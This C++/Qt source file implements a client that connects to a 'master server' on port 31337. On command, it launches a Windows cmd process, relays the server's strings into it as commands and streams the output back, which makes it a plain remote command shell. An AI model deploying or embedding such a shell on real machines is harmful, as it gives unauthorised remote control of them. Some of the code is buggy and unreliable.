#include "Client.h"
#include <iostream>
#include <QCryptographicHash>
#include <QTime>
#include <QRegExp>
Client::Client(QObject *parent) :
    QObject(parent),
    port(31337),
    server(QHostAddress::LocalHost)
{
    // Добавялем первый протокол
    availableProtocols.push_back(1);

    qDebug() << server << port;
    socket = new QTcpSocket(this);

    // Соединение с мастер-сервером
    socket->connectToHost(server, port);

    // Подключение всех необходимых сигналов
    // Исправить : не подключать если нет коннекта
    connect(socket, SIGNAL(connected()), this, SLOT(onConnect()));
    connect(socket, SIGNAL(disconnected()), this, SLOT(onDisconnect()));
    connect(socket, SIGNAL(readyRead()), this, SLOT(sortIncomingData()));

    // Ожидание 3 секунды,
    // на случай медленного инета
    if(socket->waitForConnected(3000))
        qDebug() << "Connected to " << server.toString() << port;
    else
        qDebug() << "Unable to connect";

}

void Client::onConnect()
{
    QString time = QTime::currentTime().msec();
    QString md5hash = QString(QCryptographicHash::hash((qPrintable(time)), QCryptographicHash::Md5).toHex()).mid(0, 18);
    socket->write(qPrintable(QString("cspycli:1:%1:").arg(md5hash)));
}

void Client::onDisconnect()
{
    qDebug() << "The connection to the server has been lost";
}

void Client::sortIncomingData()
{
    QRegExp rx = QRegExp("(\\w+):");

    QString incoming = socket->readAll();
    rx.indexIn(incoming);
    if(rx.captureCount()!=-1){
        QString header = rx.cap(1);
        if(header == "t"){
            parseSomeInformation(incoming);
            return;
        }

        // 1 - one
        if(header == "1"){
            parseFirstProtocol(incoming);
            return;
        }

        // l = L
        if(header == "l"){
            sendAvailableProtocols();
            return;
        }

        if(header == "a" || header == "d"){
            activateDeactivateProtocol(incoming);
            return;
        }
    }
}

void Client::parseSomeInformation(QString incoming)
{
}

void Client::parseFirstProtocol(QString incoming)
{
    // Не шарю в решулярках, наверно что-то не так,
    // но худо-бедно работает
    QRegExp rx = QRegExp("(\\w):(\\w+):");
    rx.indexIn(incoming);
    qDebug() << rx.cap(2);

    // Если команда протоколу правильная
    // и протокол запущен
    // отправить запрос в первый протокол
    // в данном случае в консоль винды
    if(rx.captureCount() != -1 && firstprotocol->Running)
        firstprotocol->write(qPrintable(QString("%1\n").arg(rx.cap(2))));
}

void Client::sendAvailableProtocols()
{
    // Крайне криво на мой вгляд.
    // Нужно упростить.
    QString protocols = "m:";
    for(short i = 0; i < availableProtocols.size(); ++i){
        protocols.append(QString::number(availableProtocols.at(i)));
        if(i < availableProtocols.size()-1)
            protocols.append(";");
    }
    protocols.append(":");
    qDebug() << protocols;
    socket->write(qPrintable(protocols));
}

void Client::activateDeactivateProtocol(QString incoming)
{
    // Я не до конца разбираюсь в регулярках
    // поэтому тут все совсем глупо
    QRegExp rx = QRegExp("(\\w):(\\d+):");
    rx.indexIn(incoming);
    QString mode= rx.cap(1);
    QString proto = rx.cap(2);
    if(mode=="a"){
        if(proto == "1"){
            firstprotocol = new QProcess(this);

            firstprotocol->start("cmd");
            connect(firstprotocol,
                    SIGNAL(readyReadStandardOutput()),
                    this,
                    SLOT(slotDataOnStdout())
                    );
        }
    }
    else {
        firstprotocol->disconnect(this);
        firstprotocol->close();
    }

}

void Client::slotDataOnStdout(){
    socket->write(qPrintable(firstprotocol->readAllStandardOutput()));
}
